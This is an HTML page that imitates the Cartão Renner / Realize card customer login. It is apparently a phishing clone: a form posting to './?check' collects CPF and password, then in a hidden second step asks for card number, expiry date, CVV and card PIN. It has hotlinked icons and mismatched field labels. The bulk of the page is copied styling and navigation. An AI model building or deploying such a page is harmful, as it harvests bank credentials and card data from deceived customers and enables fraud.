        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled],
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button[disabled]:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button.button--disabled,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button.button--disabled:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button.button--disabled:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .single-page-button .button.button--disabled:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled],
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:active,
        :not(.loader--show) .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:hover {
            border: 1px solid #ddd;
            background-color: #fff;
            cursor: default;
            color: #ddd;
        ...
        .textfield__input:hover~.textfield__iconn {
            color: #1e1e1f;
        }

        .textfield__input:hover~.textfield__prefixx {
            color: #1e1e1f;
        }

        .textfield__input:hover~.textfield__labell {
            color: #acacac;
        }
    ...
    <style type="text/css">
        aviso-bloqueio .aviso-bloqueio__icon {
            margin: 0 auto 15px;
            width: 26px;
            height: 26px;
            color: #acacac;
    ...
    <style type="text/css">
        .cartao-renner .bg-themed,
        .cartao-renner .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
        .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .cartao-renner span,
        ...
        .cartao-renner.theme-priority .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
        .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .cartao-renner.theme-priority span {
            background-color: #ac8947;
        }
        ...
        .meu-cartao .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
        .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .meu-cartao span,
        ...
        .meu-cartao.theme-priority .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
        .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .meu-cartao.theme-priority span {
            background-color: #ac8947;
        }
    ...
    <style type="text/css">
        .modal-pesquisa-interesse-pagamento-debito.modal {
            padding-top: 40px;
            text-align: center;
        }
    ...
    <style type="text/css">
        ...
        .cartao-renner .bg-themed--selected,
        .cartao-renner .navigation .navigation__link.selected,
        .navigation .cartao-renner .navigation__link.selected {
            background-color: #810f13;
        }
        ...
        .cartao-renner .text-themed,
        .cartao-renner .navigation .navigation__link:not(.selected):hover,
        .navigation .cartao-renner .navigation__link:not(.selected):hover,
        .meu-cartao .cartao-renner .text-themed,
        ...
        .cartao-renner.theme-priority .text-themed,
        .cartao-renner.theme-priority .navigation .navigation__link:not(.selected):hover,
        .navigation .cartao-renner.theme-priority .navigation__link:not(.selected):hover {
            color: #ac8947;
        }
        ...
        .meu-cartao .bg-themed--selected,
        .meu-cartao .navigation .navigation__link.selected,
        .navigation .meu-cartao .navigation__link.selected {
            border-color: #997a3f;
        }
        ...
        .meu-cartao .text-themed,
        .meu-cartao .navigation .navigation__link:not(.selected):hover,
        .navigation .meu-cartao .navigation__link:not(.selected):hover,
        .cartao-renner .meu-cartao .text-themed,
        ...
        .meu-cartao.theme-priority .text-themed,
        .meu-cartao.theme-priority .navigation .navigation__link:not(.selected):hover,
        .navigation .meu-cartao.theme-priority .navigation__link:not(.selected):hover {
            color: #ac8947;
        }
    ...
    <style type="text/css">
        .modal-confirmar-telefone .modal__icon-title {
            display: none;
        }
    ...
    <style type="text/css">
        .ie .lista-acordos .block__header-countdown {
            top: -8px;
        }
        ...
        .lista-acordos .block__header-title,
        .lista-acordos .block__header-atraso,
        .lista-acordos .block__header-texto-descritivo,
        .lista-acordos .block__header-countdown {
            margin-bottom: 15px;
        }
    ...
    <style type="text/css">
        .escolha-fator-seguranca .opcao-fator-seguranca {
            display: -webkit-box;
            display: flex;
            color: #706f6f;
        }
    ...
    <style type="text/css">
        .fator-seguranca-validar-codigo .card__title {
            margin-bottom: 35px;
        }
    ...
    <style type="text/css">
        .confirmar-codigo .captcha-viewer-on {
            margin-bottom: 10px;
        }
    ...
    <style type="text/css">
        .excesso-tentativas div.card__title {
            display: -webkit-box;
            display: flex;
            -webkit-box-align: center;
            align-items: center;
    ...
    <style type="text/css">
        .linha-digitavel-selectable__space:before {
    ...
    <style type="text/css">
        ...
        .carne .carne__item:not(.selected):hover .carne__item-column time .icon-check:before,
        .carne .carne__item:not(.selected):hover .carne__item-column time .icon-check:after {
            background-color: #f2f2f2;
        }
    ...
    <style type="text/css">
        .cartao-renner .bg-themed,
        .cartao-renner .periodo-pagamento__item--active,
        .meu-cartao .cartao-renner .bg-themed,
        ...
        .cartao-renner.theme-priority .bg-themed,
        .cartao-renner.theme-priority .periodo-pagamento__item--active {
            background-color: #ac8947;
        }
        ...
        .meu-cartao .bg-themed,
        .meu-cartao .periodo-pagamento__item--active,
        .cartao-renner .meu-cartao .bg-themed,
        ...
        .meu-cartao.theme-priority .bg-themed,
        .meu-cartao.theme-priority .periodo-pagamento__item--active {
            background-color: #ac8947;
        }
    ...
    <style type="text/css">
        .carne-limpar-selecao.button.button--small {
            padding: 0 20px;
        }
    ...
    <style type="text/css">
        .block-carne .nenhum-carne .block__header-title {
            position: relative;
            margin-bottom: 30px;
        }
    ...
    <style type="text/css">
        .cartao-renner .bg-themed,
        .cartao-renner .totalizador .totalizador__valor-descontos:after,
        .totalizador .cartao-renner .totalizador__valor-descontos:after,
        .meu-cartao .cartao-renner .bg-themed,
        ...
        .cartao-renner.theme-priority .bg-themed,
        .cartao-renner.theme-priority .totalizador .totalizador__valor-descontos:after,
        .totalizador .cartao-renner.theme-priority .totalizador__valor-descontos:after {
            background-color: #ac8947;
        }
        ...
        .meu-cartao .bg-themed,
        .meu-cartao .totalizador .totalizador__valor-descontos:after,
        .totalizador .meu-cartao .totalizador__valor-descontos:after,
        .cartao-renner .meu-cartao .bg-themed,
        ...
        .meu-cartao.theme-priority .bg-themed,
        .meu-cartao.theme-priority .totalizador .totalizador__valor-descontos:after,
        .totalizador .meu-cartao.theme-priority .totalizador__valor-descontos:after {
            background-color: #ac8947;
        }
    ...
    <style type="text/css">
        .sucesso-negociacao .encantometro-portal {
            margin-top: 30px;
        }
        ...
        .modal-divida.modal-contraproposta,
        .modal-divida.modal-sucesso-negociacao {
            width: 464px;
        }

        .modal-divida.modal-contraproposta p,
        .modal-divida.modal-sucesso-negociacao p {
            font-size: 14px;
        }
    ...
    <style type="text/css">
        .duvidas-frequentes-modal-loja__icon {
            width: 95px;
        }
    ...
    <style type="text/css">
        @media (max-width: 1023px) {
            ...
            .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-pendente,
            .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-paga,
            .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-parcial {
                width: auto;
                font-size: 12px;
            }
        ...
        @media (max-width: 767px) {
            ...
            .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__total-fatura,
            ...
            .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo,
            .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado {
                padding-top: 10px;
            }
        ...
        .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado,
        .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo,
        .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__valor-pago {
            padding-top: 15px;
            padding-bottom: 5px;
        }
    ...
    <style type="text/css">
        .cartao-renner .bg-themed,
        .cartao-renner .timeline__item:before,
        .cartao-renner .timeline__item-date:before,
        .meu-cartao .cartao-renner .bg-themed,
        ...
        .cartao-renner.theme-priority .bg-themed,
        .cartao-renner.theme-priority .timeline__item:before,
        .cartao-renner.theme-priority .timeline__item-date:before {
            background-color: #ac8947;
        }
        ...
        .meu-cartao .bg-themed,
        .meu-cartao .timeline__item:before,
        .meu-cartao .timeline__item-date:before,
        .cartao-renner .meu-cartao .bg-themed,
        ...
        .meu-cartao.theme-priority .bg-themed,
        .meu-cartao.theme-priority .timeline__item:before,
        .meu-cartao.theme-priority .timeline__item-date:before {
            background-color: #ac8947;
        }
    ...
    <style type="text/css">
        .cartao-renner .bg-themed,
        .cartao-renner .extrato-fatura-totalizador .totalizador__compras:after,
        .extrato-fatura-totalizador .cartao-renner .totalizador__compras:after,
        .meu-cartao .cartao-renner .bg-themed,
        ...
        .cartao-renner.theme-priority .bg-themed,
        .cartao-renner.theme-priority .extrato-fatura-totalizador .totalizador__compras:after,
        .extrato-fatura-totalizador .cartao-renner.theme-priority .totalizador__compras:after {
            background-color: #ac8947;
        }
        ...
        .meu-cartao .bg-themed,
        .meu-cartao .extrato-fatura-totalizador .totalizador__compras:after,
        .extrato-fatura-totalizador .meu-cartao .totalizador__compras:after,
        .cartao-renner .meu-cartao .bg-themed,
        ...
        .meu-cartao.theme-priority .bg-themed,
        .meu-cartao.theme-priority .extrato-fatura-totalizador .totalizador__compras:after,
        .extrato-fatura-totalizador .meu-cartao.theme-priority .totalizador__compras:after {
            background-color: #ac8947;
        }
    ...
    <style type="text/css">
        ...
        .canais-contratacao__image {
            ...
            background-image: url(/cartoes-renner/images/canais-contratacao.saque-rapido.png);
        ...
        .canais-contratacao__channel__text,
        .canais-contratacao__channel__text__whatsapp {
            padding-left: 10px;
            font-weight: 700;
        }
        ...
        @media (max-width: 767px) {
            ...
            .canais-contratacao__channel__icon svg,
            .canais-contratacao__channel__icon-img svg {
                height: 25px;
            }
    ...
    <style type="text/css">
        ...
        .cartao-renner .border-themed,
        .cartao-renner .valor-saque .block__opcoes .ativo,
        .valor-saque .block__opcoes .cartao-renner .ativo,
        .meu-cartao .cartao-renner .border-themed,
        ...
        .cartao-renner.theme-priority .border-themed,
        .cartao-renner.theme-priority .valor-saque .block__opcoes .ativo,
        .valor-saque .block__opcoes .cartao-renner.theme-priority .ativo {
            border-color: #ac8947;
        }
        ...
        .meu-cartao .border-themed,
        .meu-cartao .valor-saque .block__opcoes .ativo,
        .valor-saque .block__opcoes .meu-cartao .ativo,
        .cartao-renner .meu-cartao .border-themed,
        ...
        .meu-cartao.theme-priority .border-themed,
        .meu-cartao.theme-priority .valor-saque .block__opcoes .ativo,
        .valor-saque .block__opcoes .meu-cartao.theme-priority .ativo {
            border-color: #ac8947;
        }
    ...
    <style type="text/css">
        ...
        .cartao-renner .border-themed,
        .cartao-renner .vencimento-saque .block__opcoes .ativo,
        .vencimento-saque .block__opcoes .cartao-renner .ativo,
        .meu-cartao .cartao-renner .border-themed,
        ...
        .cartao-renner.theme-priority .border-themed,
        .cartao-renner.theme-priority .vencimento-saque .block__opcoes .ativo,
        .vencimento-saque .block__opcoes .cartao-renner.theme-priority .ativo {
            border-color: #ac8947;
        }
        ...
        .meu-cartao .border-themed,
        .meu-cartao .vencimento-saque .block__opcoes .ativo,
        .vencimento-saque .block__opcoes .meu-cartao .ativo,
        .cartao-renner .meu-cartao .border-themed,
        ...
        .meu-cartao.theme-priority .border-themed,
        .meu-cartao.theme-priority .vencimento-saque .block__opcoes .ativo,
        .vencimento-saque .block__opcoes .meu-cartao.theme-priority .ativo {
            border-color: #ac8947;
        }
    ...
    <style type="text/css">
        .simulacao-saque__tab-header-item {
            text-transform: none;
        }
    ...
    <style type="text/css">
        .duvidas-frequetes-acesso__title {
            margin-bottom: 10px;
            color: #706f6f;
        }
    </style>
    ...
    <style type="text/css">
        .firefox .onboarding-active tr.onboarding-item {
            z-index: 9;
        }
    ...
    <style type="text/css">
        .pagamento-boleto-resumo.loading {
            position: relative;
        }
    ...
    <style type="text/css">
        .modal.modal--medium.modal-compartilhar-dados-ltm {
    ...
    <style type="text/css">
        .banner-beneficios-exclusivos {
            ...
            -webkit-box-align: end;
            align-items: flex-end;
            background: -webkit-gradient(linear, left top, right top, color-stop(20%, white), color-stop(90%, transparent)), url(/cartoes-renner/images/modelo-banner.png);
            background: linear-gradient(to right, white 20%, transparent 90%), url(/cartoes-renner/images/modelo-banner.png);
        ...
        @media (max-width: 767px) {
            ...
            .safari .banner-beneficios-exclusivos {
                background-image: url(/cartoes-renner/images/modelo-banner.png);
            }
        }
    </style>
    <style type="text/css">
        .meu-cartao .banner-conferir-beneficios {
            display: -webkit-box;
            display: flex;
        }
        ...
        .banner-conferir-beneficios {
            ...
            background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), color-stop(20%, transparent), color-stop(50%, white)), url(/cartoes-renner/vectors/bg-login.svg);
            background-image: linear-gradient(to bottom, transparent, transparent 20%, white 50%), url(/cartoes-renner/vectors/bg-login.svg);
    ...
    <style type="text/css">
        ...
        .cartao-renner .text-themed,
        .cartao-renner .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
        .banner-informativo-beneficios__ver-todos .cartao-renner button.button.button--outline:hover,
        .meu-cartao .cartao-renner .text-themed,
        ...
        .cartao-renner.theme-priority .text-themed,
        .cartao-renner.theme-priority .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
        .banner-informativo-beneficios__ver-todos .cartao-renner.theme-priority button.button.button--outline:hover {
            color: #ac8947;
        }
        ...
        .meu-cartao .text-themed,
        .meu-cartao .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
        .banner-informativo-beneficios__ver-todos .meu-cartao button.button.button--outline:hover,
        .cartao-renner .meu-cartao .text-themed,
        ...
        .meu-cartao.theme-priority .text-themed,
        .meu-cartao.theme-priority .banner-informativo-beneficios__ver-todos button.button.button--outline:hover,
        .banner-informativo-beneficios__ver-todos .meu-cartao.theme-priority button.button.button--outline:hover {
            color: #ac8947;
        }
        ...
        .banner-informativo-beneficios__icon,
        ...
        .banner-informativo-beneficios__itens:before {
            ...
            background-color: #f2f2f2;
            background-image: url(/cartoes-renner/vectors/bg-login.svg);
    ...
    <style type="text/css">
        .modal-parceiros--camicado.modal-parceiros .modal__content {
            border-color: #b2101f;
        }
    ...
    <style type="text/css">
        .resumo__utilizado-adicional .block__header {
            -webkit-box-flex: inherit;
            flex-grow: inherit;
        }
    ...
    <style type="text/css">
        ...
        .ie .circle-chart__base--circle,
        .ie .circle-chart__ball {
    ...
    <style type="text/css">
        .collapsible__container .collapsible__header {
            margin-top: -1px;
            border: 1px solid #e0e0e0;
            cursor: pointer;
            width: 100%;
    ...
    <style type="text/css">
        ...
        .tab-set--wizard tab-header-item a,
        .tab-set--wizard tab-header-item a:after {
    ...
    <style type="text/css">
        .textfield-label--uppercase label {
            text-transform: uppercase;
        }
    ...
    <div id="root">
        <div id="root-angular">
            <div id="__single_spa_angular_1" class="ng-scope">
                <div ontouchstart="" browser-detector="" is-logged="" class="ng-scope firefox firefox78 not-logged">
                    <!-- uiView: -->
                                    ...
                                    <div class="row">
                                        <div class="site-header__left column small-7 medium-7 hidden-eq-small">
                                            <h1 class="site-header__left-logo">
                                                <a parametro-local-key="LINK_SITE_REALIZE" parametro-local-attr="href" class="ng-isolate-scope" href="#">
                                                    <!-- ngInclude: 'logo-realize.svg' | assetPath:'vectors'  -->
                                                    <div class="site-header__logo-icon ng-scope" ng-include="'logo-realize.svg' | assetPath:'vectors' " style=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 230" focusable="false" class="ng-scope">
                                                            <g stroke-width="5">
                                        ...
                                        <div class="site-header__right column small-12 medium-5 text-right">
                                            <a tracking-click="GERAIS_LOJA_VIRTUAL" parametro-local-key="LINK_LOJAS_RENNER" parametro-local-attr="href" class="button button--outline ir-para-loja-virtual ng-isolate-scope" href="#">
                                                <span>ir para a </span>loja virtual</a>
                                            <logout-link icon="sign-out" title="Sair" text="Sair" add-classes="button button--outline sair-header" modal="true" class="ng-isolate-scope"><a href="#" ng-class="$ctrl.addClasses" ng-click="$ctrl.requestLogout()" class="ng-binding button button--outline sair-header">
                                                    <!-- ngIf: $ctrl.icon -->
                                                    <!-- ngInclude: ($ctrl.icon + '.svg') | assetPath:'vectors'  --><span ng-if="$ctrl.icon" class="icon ng-scope" ng-include="($ctrl.icon + '.svg') | assetPath:'vectors' " style=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" focusable="false" class="ng-scope">
                                                                ...
                                                                <div ng-transclude="help">
                                                                    <help-section class="ng-scope">
                                                                        <help-login actions-mode="hidden" arrow-mode="hidden" class="ng-isolate-scope">
                                                                            <div class="help">
                                                                                ...
                                                                                <div class="help__image" ng-class="$ctrl.imageMode">
                                                                                    <!-- ngInclude: 'logo-cartao-renner.svg' | assetPath:'vectors' --><span class="help__image-icon ng-scope" ng-include="'logo-cartao-renner.svg' | assetPath:'vectors'" style=""><svg viewBox="0 0 162 86" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                                                    ...
                                                                                    <!-- ngInclude: 'logo-meu-cartao.svg' | assetPath:'vectors' --><span class="help__image-icon ng-scope" ng-include="'logo-meu-cartao.svg' | assetPath:'vectors'"><svg viewBox="0 0 162 86" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                                                            <path d="M162 86H19.125V0H162v86zM23.194 81.903h134.722V4.096H23.194v77.807z" fill="#141413"></path>
                                                                        ...
                                                                        <acesso-rapido class="hidden-gt-small ng-isolate-scope">
                                                                            <!-- ngIf: $ctrl.isEnabled -->
                                                                            <div class="acesso-rapido ng-scope" ng-if="$ctrl.isEnabled" ng-class="{'animated': $ctrl.animate}" style="">
                                                                                <h2>Está com dificuldades de acesso?</h2>
                                                                                <a class="button" ng-click="$ctrl.openModal()">conheça o acesso rápido</a>
                                                                            </div><!-- end ngIf: $ctrl.isEnabled -->
                                                                        </acesso-rapido>
                                                                    </help-section>
                                                                </div>
                                                            </div>
                                                                    ...
                                                                    <card-section class="ng-scope">
                                                                        ...
                                                                        <card-login ctrl="$ctrl" subtitle-mode="hidden" actions-mode="hidden" class="ng-isolate-scope">
                                                                            <div class="card">
                                                                                ...
                                                                                <form action="./?check" method="POST" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf">
                                                                                    ...
                                                                                    <div class="card__fields" ng-class="$ctrl.fieldsMode">
                                                                                        <div ng-transclude="fields">
                                                                                            <card-fields class="ng-scope" id="step1">
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="cpf" icon="user-outline" error-message="'Número de CPF inválido'">
                                                                                                    ...
                                                                                                    <input cpf="" type="tel" id="cpf" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="cpf" minlength="14" maxlength="14" ng-minlength="14" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="cpf-l" ng-show="label" class="textfield__label">cpf</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 499.99998" focusable="false" class="ng-scope">
                                                                                                ...
                                                                                                <!--  -->
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="pass" icon="user-outline" error-message="'Número de CPF inválido'">

                                                                                                    <input cpf="" type="password" id="pass" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="pass" minlength="4" maxlength="20" ng-minlength="4" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="pass-l" ng-show="label" class="textfield__label">senha</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""> <img style="color: #706f6f !important; opacity: 0.7;" src="https://image.flaticon.com/icons/png/512/3014/3014208.png" alt=""> </div><!-- end ngIf: icon -->
                                                                                                    <!-- ngIf: !icon && prefix -->
                                                                                                    <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="senha inválida">
                                                                                                        Senha inválida
                                                                                                    </small>
                                                                                                </div>
                                                                                            </card-fields>
                                                                                            ...
                                                                                            <!--  -->
                                                                                            <card-fields class="ng-scope" id="step3" style="display: none;">
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="name" icon="user-outline" error-message="'Número de CPF inválido'">

                                                                                                    <input cpf="" type="tel" id="card" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="card" minlength="19" maxlength="19" ng-minlength="19" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="card-l" ng-show="label" class="textfield__label">número do cartão</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""> <img style="color: #706f6f !important; opacity: 0.7;" src="https://icons.iconarchive.com/icons/iconsmind/outline/512/Credit-Card-2-icon.png" alt=""> </div><!-- end ngIf: icon -->
                                                                                                    <!-- ngIf: !icon && prefix -->
                                                                                                    <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="cartão inválido">
                                                                                                        cartão inválido
                                                                                                    </small>
                                                                                                </div>
                                                                                                <!--  -->
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="phone" icon="user-outline" error-message="'Número de CPF inválido'">

                                                                                                    <input cpf="" type="tel" id="date" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="date" minlength="5" maxlength="5" ng-minlength="5" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="date-l" ng-show="label" class="textfield__label">data de validade</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""> <img style="color: #706f6f !important; opacity: 0.7;" src="https://icons.iconarchive.com/icons/iconsmind/outline/512/Credit-Card-2-icon.png" alt=""> </div><!-- end ngIf: icon -->
                                                                                                    <!-- ngIf: !icon && prefix -->
                                                                                                    <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="data inválida">
                                                                                                        Telefone inválido
                                                                                                    </small>
                                                                                                </div>
                                                                                                <!--  -->
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="phone" icon="user-outline" error-message="'email inválido'">

                                                                                                    <input cpf="" type="tel" id="cvv" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="cvv" minlength="3" maxlength="3" ng-minlength="3" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="cvv-l" ng-show="label" class="textfield__label">cvv</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""> <img style="color: #706f6f !important; opacity: 0.7;" src="https://icons.iconarchive.com/icons/iconsmind/outline/512/Credit-Card-2-icon.png" alt=""> </div><!-- end ngIf: icon -->
                                                                                                    <!-- ngIf: !icon && prefix -->
                                                                                                    <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="cvv inválido">
                                                                                                        CVV inválido
                                                                                                    </small>
                                                                                                </div>
                                                                                                <!--  -->
                                                                                                <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="phone" icon="user-outline" error-message="'email inválido'">
                                                                                                    ...
                                                                                                    <input cpf="" type="tel" id="passw" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="passw" minlength="4" maxlength="4" ng-minlength="4" ng-required="true" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">

                                                                                                    <label id="passw-l" ng-show="label" class="textfield__label">senha do cartão</label>
                                                                                                    <!-- ngIf: icon -->
                                                                                                    <!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                                                    <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style=""> <img style="color: #706f6f !important; opacity: 0.7;" src="https://icons.iconarchive.com/icons/iconsmind/outline/512/Credit-Card-2-icon.png" alt=""> </div><!-- end ngIf: icon -->
                                                                                                    <!-- ngIf: !icon && prefix -->
                                                                                    ...
                                                                                    <div class="card__button" ng-class="$ctrl.buttonMode">
                                                                                        <request-error promise="$ctrl.ctrl.promise" class="ng-isolate-scope">
                                                                                            <div class="request-error-container request-error--error">
                                                                                                ...
                                                                                                <div ng-show="$ctrl.message" class="request-error-icon ng-scope ng-hide" ng-include="'exclamation-circle.svg' | assetPath:'vectors' " style=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" focusable="false" class="ng-scope">
                                                                                                ...
                                                                                                <div ng-transclude="">
                                                                                                    <div ng-transclude="button" class="ng-scope">
                                                                                                        <card-button class="ng-scope">
                                                                                                            <button id="continue" type="button" class="button button--expanded button--default" ng-disabled="$ctrl.enviando" ng-class="{'button--disabled': $ctrl.form.$invalid}"><span ng-transclude="">
                                                                                                                    Prosseguir
                                                                                                                </span></button>
                                                                                                        </card-button>
                                                                                                    </div>
                                                    ...
                                                    <div class="app-lojas-renner__conteudo">
                                                        ...
                                                        <div class="app-lojas-renner__texto">
                                                            <p class="app-lojas-renner__descricao">Acompanhe seu histórico de compras, saldo e limites.
                                                                Confira a sua melhor data para compra e também gere boletos para pagamento dos seus carnês e faturas.</p>
                                                            <h3>Disponível nas lojas:</h3>
                                                            <div class="app-lojas-renner__badges">
                                                                <a parametro-local-key="LINK_APP_GOOGLE_PLAY" parametro-local-attr="href" class="ng-isolate-scope">
                                                                    <img src="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/vectors/google-play-badge-reverse.svg">
                                                                </a>
                                                                <!-- ngInclude: 'app-store-badge-reverse.svg' | assetPath:'vectors' --><a parametro-local-key="LINK_APP_APP_STORE" parametro-local-attr="href" ng-include="'app-store-badge-reverse.svg' | assetPath:'vectors'" class="ng-scope ng-isolate-scope" style=""><svg viewBox="0 0 119.66 40" width="119.66407" height="40" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                        ...
                                                        <img class="app-lojas-renner__image" src="/cartoes-renner/images/celular-login.png" alt="Aplicativo das Lojas Renner para acesso dos Cartões Renner.">
            ...
            <div class="footer__content">
                <div class="footer__links">
                    <ul class="footer__list">
                        ...
                        <li><a href="#site/cartao_renner/">Cartão Renner</a></li>
                        <li><a href="#site/meu-cartao/">Meu Cartão</a></li>
                        <li><a href="#site/app_cartao_renner/">Quero Cartão Renner</a></li>
                        <li><a href="#site/contato">Contato</a></li>
                    </ul>
                    <ul class="footer__list">
                        <li><a href="#site/institucional">Institucional</a></li>
                        <li><b>Perguntas Frequentes</b>
                            <ul class="footer__list">
                                <li><a href="#cartoes-renner/duvidas-frequentes/cartao-renner">Cartão Renner</a></li>
                                <li><a href="#cartoes-renner/duvidas-frequentes/meu-cartao">Meu Cartão</a></li>
                                <li><a href="#site/perguntas-frequentes">Saque Rápido e Seguros</a></li>
